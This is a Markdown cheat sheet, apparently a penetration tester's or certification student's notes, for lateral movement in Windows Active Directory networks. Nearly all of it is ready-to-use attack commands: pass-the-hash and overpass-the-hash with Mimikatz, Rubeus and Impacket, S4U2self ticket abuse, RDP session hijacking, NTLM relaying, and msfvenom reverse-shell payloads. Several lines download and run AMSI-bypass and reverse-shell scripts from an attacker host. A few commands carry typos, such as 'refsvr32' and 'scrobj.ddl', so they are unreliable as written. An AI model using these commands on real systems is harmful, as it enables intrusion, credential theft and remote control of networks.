# Lateral Movement
* [General](#General)
* [Check Local Admin Access](#Check-Local-Admin-Access)  
* [Pass The Hash](#Pass-The-Hash)
  * [Overpass The Hash](#Overpass-The-Hash)
* [S4U2self](#S4U2self)
* [Lateral Movement Techniques](#Lateral-Movement-Techniques)
  * [PSSession](#PSSession) 
  * [PSExec](#PSExec)
  * [SC.exe](#SC.exe)
  * [Schtasks.exe](#schtasks.exe)
  * [AT](#AT)
  * [WMI](#WMI)
  * [Poisonhandler](#Poisonhandler)
  * [RDP](#RDP)
  * [ChangeServiceConfigA](#ChangeServiceConfigA)
  * [WinRM](#WinRM)
  * [DCOM](#DCOM)
  * [Named Pipes](#Named-Piped)
  * [Powershell Web access](#Powershell-Web-access)
  * [NTLM Relaying](#NTLM-Relaying)

## General
### Running stuff as context of other user
#### Runas other user
```
runas /netonly /user:<DOMAIN>\<USER> cmd.exe
runas /netonly /user:<DOMAIN>\<USER> powershell.exe
```

#### Better runas
- https://github.com/antonioCoco/RunasCs
```
.\RunasCs.exe <USER> <PASSWORD> -d <DOMAIN> <COMMAND>

Invoke-RunasCs -Username <USER> -Password <PASSWORD> -Domain <DOMAIN> -Command <COMMAND>
```

#### Rubeus request tgt
```
.\rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /dc:<DC IP> /rc4:<HASH>
```

#### Mimikatz overpass the hash
```
mimikatz.exe sekurlsa::pth /domain:<DOMAIN> /user:<USER> /rc4:<HASH>
```

## Check Local Admin Access
#### Crackmapexec
```
cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
cme winrm <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
cme mssql <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
cme rdp <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
```

#### Powerview
```
Find-LocalAdminAccess -Verbose
```

### Other scripts
```
. ./Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
```

```
. ./Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

## Pass the hash
#### Mimikatz pass the hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe"'
```

#### SafetyKatz pass the hash
```
SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:cmd.exe" "exit" 
```

#### Impacket
- Use the empty lm hash ```00000000000000000000000000000000```
- https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries
- Also works with Linux variants ofc
```
.\psexec_windows.exe -hashes <LM HASH>:<NTLM HASH> <DOMAIN>/<USER>@<COMPUTERNAME>
```

#### Crackmapexec
- Requires elevated privileges to execute commands with the `-x` parameter
```
cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
cme winrm <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
cme mssql <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
cme rdp <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
```

#### Invoke-TheHash
- https://github.com/Kevin-Robertson/Invoke-TheHash
- Can use the command ```net localgroup administrators <DOMAIN>\<USERNAME> /add``` and do ```enter-pssession``` after to connect 
```
Invoke-SMBExec -Target <COMPUTERNAME> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM HASH> -Command <COMMAND> -Verbose
```

#### Psexec
- Sysinternals Psexec seems to only work with password or after a overpass the hash attack with Mimikatz!
- Impacket: https://github.com/maaaaz/impacket-examples-windows
```
.\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <DOMAIN>\<ADMINISTRATOR -p <PASSWORD> -i cmd.exe
.\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <COMPUTERNAME>\administrator -p <PASSWORD> -i cmd.exe
.\PsExec64.exe \\<COMPUTERNAME> -accepteula 

.\psexec_windows.exe <DOMAIN>/<USER>@<TARGET FQDN> -hashes :<NTLM HASH>
```

### Overpass The Hash
- Over Pass the hash (OPTH) generate tokens(kerberos) from hashes or keys. Needs elevation (Run as administrator)
- OPSEC TIP: Use aes256 keys!

#### Calculate NTLM hash
```
.\Rubeus.exe hash /password:<PASSWORD> /user:<USER> /domain:<DOMAIN>
```

#### Rubeus
- Below doesn't need elevation
```
Rubeus.exe asktgt /user:<USER> /rc4:<NTLM HASH> /domain /nowrap /ptt
Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /domain /opsec /nowrap /ptt
```

- Below command needs elevation
```
Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /domain /opsec /nowrap /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Double hop issue
#### Pssession in pssession
```
Enter-PSSession -ComputerName <NAME>
$sess = New-PSSession <SERVER> -Credential <DOMAIN>\<USER>
Invoke-Command -Scriptblock {hostname; whoami;} -Session $sess
```

#### Overpass the hash mimikatz reverse shell
```
powercat -l -v -p 444 -t 5000

$sess = New-PSSession <SERVER> 
#.ps1 is a reverse shell back to the attacker machine, make sure you run it as the user you want
$Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/etw.txt'')); iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/amsi.txt'')); iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''))'; Out-File -Encoding Ascii -InputObject $Contents -FilePath reverse.bat

Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:C:\reverse.bat"'
```

#### Psexec then pssession
- https://github.com/maaaaz/impacket-examples-windows
```
.\psexec_windows.exe <DOMAIN>/<USER>@<TARGET FQDN> -hashes :<NTLM HASH>
powershell.exe
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
$sess = new-pssession -credential $creds -computername <TARGET FQDN>
enter-pssession $sess
```

## S4U2self
- Gain access to a domain computer if we have its RC4, AES256 or TGT.
- There are means of obtaining a TGT for a computer without already having local admin access to it, such as pairing the Printer Bug and a machine with unconstrained delegation, NTLM relaying scenarios and Active Directory Certificate Service abuse

#### Dump TGT
```
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:<LUID> /service:krbtgt
```

#### Check for user to impersonate
```
Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
```

#### Request TGS
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right.
- Make sure they are local admin on the target machine.
```
.\Rubeus.exe s4u /impersonateuser:<USER> /self /altservice:cifs/<COMPUTER FQDN> /user:<COMPUTERNAME>$ /ticket:<TGT TICKET> /nowrap
```

#### Load the ticket
```
.\Rubeus.exe /ticket:<TICKET BASE64> /ptt
.\Rubeus.exe /ticket:<FILE TO KIRBI FILE> /ptt
```
 
#### Execute ls on the computer
```
ls \\<COMPOTERNAME FQDN>\C$
```

## Lateral Movement Techniques

### PSSession
- Uses winrm / wmi
- Work with the `-Credential $creds` parameter.

#### Create credential object
```
$creds = get-credential

$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<USERNAME>', $password)
```

#### Connect to machine
```
Enter-PSSession -Computername <COMPUTERNAME>
```

#### Connect to machine and save in session variable
```
$sess = New-PSSession -Computername <COMPUTERNAME>
Enter-PSSession $sess
```

#### Execute commands on a machine
```
Invoke-Command -Computername <COMPUTERNAME> -Scriptblock {<COMMAND>} 
Invoke-Command -Scriptblock {<COMMAND>} $sess
```

#### Load script on a machine
```
Invoke-Command -Computername <COMPUTERNAME> -FilePath <PATH>
Invoke-Command -FilePath <PATH> $sess
```

#### Run commands on multiple machines
```
Invoke-Command –Scriptblock {<COMMAND>} -ComputerName (Get-Content computers.txt)
```

#### Execute script on multiple machines
```
Invoke-Command –FilePath script.ps1 -ComputerName (Get-Content computers.txt)
```

#### Execute locally loaded function on remote machines:
```
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content computers.txt)
```

#### Copy item to PSSession
```
Copy-Item -ToSession $sess -Path <PATH> -Destination <DEST> -verbose
```

#### Copy item from PSSession
```
Copy-Item -FromSession $sess -Path <PATH> -Destination <DEST> -verbose
```

#### PSremoting NTLM authetication (after overpass the hash)
```
Enter-PSSession -ComputerName <COMPUTERNAME> -Authentication NegotiateWithImplicitCredential
```

#### Get trusted hosts
```
Get-Item WSMan:\localhost\Client\TrustedHosts
```

#### Add trusted host
```
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '<MACHINE OR IP>' -Concatenate
```

#### Trust all hosts
```
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*'
```

#### Connect from kali
```
pwsh
$pass = ConvertTo-SecureString '<PASS>' -AsPlainText -force
$cred = New-Object System.Management.Automation.PSCredential('<FQDN DOMAIN>\<USER>',$pass)
Enter-PSSession -Computer <IP> -credential $cred -Authentication Negotiate
```

### PSexec
```
psexec.exe -u <DOMAIN>\<USER> -p <PASSWORD> \\<TARGET> cmd.exe
python psexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
```

### SC.exe
- Smbexec.py can be used to automate the process
```
sc.exe \\<TARGET> create SERVICE_NAME displayname=NAME binpath="COMMAND" start=demand
sc.exe \\<TARGET> start SERVICE_NAME
sc.exe \\<TARGET> delete SERVICE_NAME
```

### Schtasks.exe
```
schtasks /create /F /tn <TASKNAME> /tr COMMAND /sc once /st 23:00 /s <TARGET> /U <USER> /P <PASSWORD>
schtasks /run /F /tn <TASKNAME> /s <TARGET> /U <USER> /P <PASSWORD>
schtasks /delete /F /tn <TASKNAME> /s <TARGET>
```

### AT
```
reg.py
atexec.py
```

### WMI
```
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
``` 

### PoisonHandler
- https://github.com/Mr-Un1k0d3r/PoisonHandler

### RDP
#### Pass the hash rdp xfreerdp
```
xfreerdp /u:<USER> /d:<DOMAIN> /pth:<NTLM HASH> /v:<TARGET>
```

#### Pass the hash RDP
```
Invoke-Mimikatz -Command "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm<NTLM HASH> /run:'mstsc.exe /restrictedadmin'"
```

- If the admin mode is disabled
```
Enter-PSSession -Computername <TARGET>
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
```

#### Hijack RDP session
```
query user
sc.exe create rdphijack binpath="cmd.exe /c tscon <ID> /dest:<SESSION NAME>"
net start rdphijack
sc.exe delete rdphijack
```

#### Accessing RDP credentials
- Complicated have to access ECPPTX again and try it out

### ChangeServiceConfigA
- https://github.com/SpiderLabs/SCShell
- Uses DCERPC instead of SMB

```
SCShell.exe <TARGET> XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\refsvr32.exe /s /n /u /i://<PAYLOAD WEBSITE>/payload.sct scrobj.ddl" . <USER> <PASSWORD>
SCShell.py
```

### WinRM
- Uses WMI over HTTPS (P 5985 and 5986)
- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs
- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-6
- https://github.com/Hackplayers/evil-winrm
- https://github.com/bohops/WSMan-WinRM

### DCOM
- https://github.com/SecureAuthCorp/impacket dcom.exec.py
- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1

### Named Pipes
- https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-Pbind.ps1

```
Invoke-Pbing -Target <TARGET> -Domain <DOMAIN> -User <USER> -Password <PASSWORD>
```

### Powershell Web access
- PSWA runs on port 443 on ```/pswa```

#### Install Powershel web access on target
```
Install-WindowsFeature -Name WindowsPowerShellWebAccess
Instal-PswaWebApplication -useTestCertificate
Add-PswaAuthorizationRule -Username <USERNAME> -Computername <COMPUTER> -ConfigurationName <CONFIG NAME>

# Allow everyone (Still requires localadmin on target server)
Add-PswaAuthorizationRule -Username * -Computername * -ConfigurationName *
```

#### Access PSWA
- Go to ```https://<IP>/pswa``` and then login using ```<DOMAIN>/<USER>```

### NTLM Relaying
- https://github.com/lgandx/Responder
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py

#### Crackmapexec list hosts with SMB signed disabled
```
crackmapexec smb <CIDR> --gen-relay-list <OUTPUT FILE>
```

- Edit Responder config file to disable HTTP server and SMB server

#### Run NTLM Relay
```
ntlmrelay.py -t <TARGET> -c 'powershell.exe iex (New-Object.Net.Webclient).Downloadstring(\"http://<ATTACKER IP>/Invoke-PowerShellTcp.ps1\")"' -smb2support 
```
 
#### Run Responder
```
responder -I <INTERFACE> -v
```

#### Usefull payloads
```
# Meterpreter ps1 rev shell
msfvenom -p windows/x64/meterpreter_reverse_https -f psh -o msf.ps1 lhost=<HOST> lport=<PORT> exitfunc=thread

# Meterpreter bind tcp executable
msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=<HOST> LPORT=<PORT> -f exe -o bind_tcp.exe

# Meterpreter reverse tcp executable
Msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<HOST> LPORT=<PORT> -f exe > shell.exe

# Bat file to run reverse powershell
msfvenom -p cmd/windows/reverse_powershell LHOST=<HOST> LPORT=<PORT> > attach.bat
```

#### Reverse.bat
```
powershell.exe -c "iex (New-Object Net.WebClient).DownloadString('http://<IP>/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp2.ps1')"
```
 
